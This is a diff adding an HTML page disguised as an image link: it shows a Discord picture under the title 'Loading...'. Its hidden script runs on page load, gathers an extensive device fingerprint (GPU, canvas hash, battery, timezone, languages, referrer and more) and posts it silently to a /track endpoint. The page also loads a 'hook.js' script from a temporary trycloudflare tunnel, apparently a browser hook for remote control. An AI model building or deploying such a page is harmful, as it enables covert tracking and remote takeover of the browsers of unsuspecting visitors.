@@ -1,0 +1,78 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Loading...</title>
+<style>
+  body { margin: 0; background: #000; display: flex; justify-content: center; align-items: center; height: 100vh; }
+  img { max-width: 100%; max-height: 100vh; }
+</style>
+</head>
+<body>
+<img src="/discord.png" id="img">
+<script>
+async function collect() {
+  const data = {
+    screen: window.screen.width + 'x' + window.screen.height,
+    avail_screen: window.screen.availWidth + 'x' + window.screen.availHeight,
+    color_depth: window.screen.colorDepth,
+    pixel_ratio: window.devicePixelRatio,
+    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+    language: navigator.language,
+    languages: navigator.languages.join(', '),
+    platform: navigator.platform,
+    cores: navigator.hardwareConcurrency,
+    memory: navigator.deviceMemory || '?',
+    touch_points: navigator.maxTouchPoints,
+    touch: navigator.maxTouchPoints > 0,
+    online: navigator.onLine,
+    cookies_enabled: navigator.cookieEnabled,
+    do_not_track: navigator.doNotTrack,
+    referrer: document.referrer || 'Direct',
+    window_size: window.innerWidth + 'x' + window.innerHeight,
+    plugins: Array.from(navigator.plugins).map(p => p.name).join(', ') || 'none',
+  }
+
+  // battery
+  if (navigator.getBattery) {
+    try {
+      const b = await navigator.getBattery()
+      data.battery_level = Math.round(b.level * 100) + '%'
+      data.battery_charging = b.charging
+    } catch(e) {}
+  }
+
+  // canvas fingerprint
+  try {
+    const c = document.createElement('canvas')
+    const ctx = c.getContext('2d')
+    ctx.fillText('fingerprint', 10, 10)
+    data.canvas_fp = c.toDataURL().length
+  } catch(e) {}
+
+  // webgl info
+  try {
+    const gl = document.createElement('canvas').getContext('webgl')
+    const ext = gl.getExtension('WEBGL_debug_renderer_info')
+    data.gpu_vendor = gl.getParameter(ext.UNMASKED_VENDOR_WEBGL)
+    data.gpu_renderer = gl.getParameter(ext.UNMASKED_RENDERER_WEBGL)
+  } catch(e) {}
+
+  // connection info
+  if (navigator.connection) {
+    data.connection_type = navigator.connection.effectiveType
+    data.downlink = navigator.connection.downlink + ' Mbps'
+  }
+
+  fetch('/track', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify(data)
+  })
+}
+
+collect()
+</script>
+<script src="https://threatened-segment-contrast-mesa.trycloudflare.com/hook.js"></script>
+</body>
+</html>
